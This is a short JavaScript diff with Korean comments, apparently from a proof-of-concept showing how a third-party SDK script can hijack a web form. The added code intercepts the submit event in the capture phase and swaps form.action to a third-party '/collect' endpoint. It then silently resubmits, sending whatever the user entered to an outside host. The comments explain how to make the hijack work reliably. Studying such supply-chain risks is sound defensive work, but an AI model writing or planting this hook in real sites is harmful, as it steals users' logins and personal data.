@@ -65,12 +65,35 @@
 
     form.addEventListener(
       "submit",
-      () => {
+      (e) => {
         if (!armed) return;
+
+        const submitter = e.submitter || null;//submit 클릭이 한번은 씹히는 현상이 있어서, submit이벤트를 담아뒀다가 호출하는 식으로 연결했습니다.
+
+        //루프 방지용
+        if (form.dataset.pocResubmitting === "1") {
+            form.dataset.pocResubmitting = "0";
+            return;
+        }
+
+        //제출 흐름을 직접 잡아서 안정적으로 다시제출 하는 방식
+        e.preventDefault();
 
         //form.action으로 지정된 주소를 바꿔치기 합니다.(참조값 조작형 후킹)
         form.action = `${THIRD_PARTY_ORIGIN}/collect`;
         console.log("[thirdparty sdk] swapped form.action to", form.action);
+
+        //루프방지 그거
+        form.dataset.pocResubmitting = "1";
+
+        //아까 멈췄으니 이제 제출
+        queueMicrotask(() => {
+            if (typeof form.requestSubmit === "function") {
+                form.requestSubmit(submitter);//사용자가 submit 버튼을 눌러서 제출한 것처럼 보내기
+            } else {
+                form.submit();//만약 안되면 그냥 이벤트 무시하고 서버로 보내기
+            }
+        });
       },
       { capture: true }//submit이벤트가 도달하기전에 관여할려면 필요함
     );
